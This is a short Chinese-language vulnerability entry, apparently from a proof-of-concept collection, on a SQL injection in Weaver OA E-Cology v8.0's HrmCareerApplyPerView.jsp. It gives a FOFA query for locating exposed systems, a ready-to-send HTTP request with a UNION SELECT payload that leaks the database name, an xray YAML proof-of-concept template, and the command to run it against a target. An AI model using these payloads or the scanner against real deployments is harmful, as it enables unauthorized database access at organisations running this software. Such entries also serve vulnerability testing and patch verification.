# 泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞
## 漏洞描述

泛微新一代移动办公平台e-cology8.0不仅组织提供了一体化的协同工作平台,将组织事务逐渐实现全程电子化,改变传统纸质文件、实体签章的方式。泛微OA E-Cology v8.0平台HrmCareerApplyPerView.jsp处存在SQL注入漏洞，攻击者通过漏洞可以获取数据库权限。
## 影响版本
```
泛微OA E-Cology v8.0
```

## 网络测绘
```
app="泛微-协同办公OA"
```

## 环境搭建

-

## 漏洞复现

![image.png](https://cdn.jsdelivr.net/gh/klearcc/pic/img202309200059751.png)


## 数据包
```
GET /pweb/careerapply/HrmCareerApplyPerView.jsp?id=1+union+select+1%2C2%2Csys.fn_sqlvarbasetostr%28HashBytes%28%27MD5%27%2C%27abc%27%29%29%2Cdb_name%281%29%2C5%2C6%2C7 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)
Accept-Encoding: gzip, deflate
Connection: close

```

## YAML代码
```
name: poc-yaml-ecology-hrmcareerapplyperview-sql
manual: true
transport: http
set:
  s1: randomInt(8000, 10000)
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','{{s1}}')),4,5,6,7
    expression: response.status == 200 && response.body.bcontains(bytes(substr(md5(string(s1)), 0, 31)))
expression: r0()
detail:
  author: klear
  links:
    - https://peiqi.wgpsec.org/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20HrmCareerApplyPerView.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html

```

## xray调用

```
xray ws --poc poc-yaml-ecology-HrmCareerApplyPerView-sql.yml --url xx.xx.xx.xx
```

![image.png](https://cdn.jsdelivr.net/gh/klearcc/pic/img202309200145918.png)
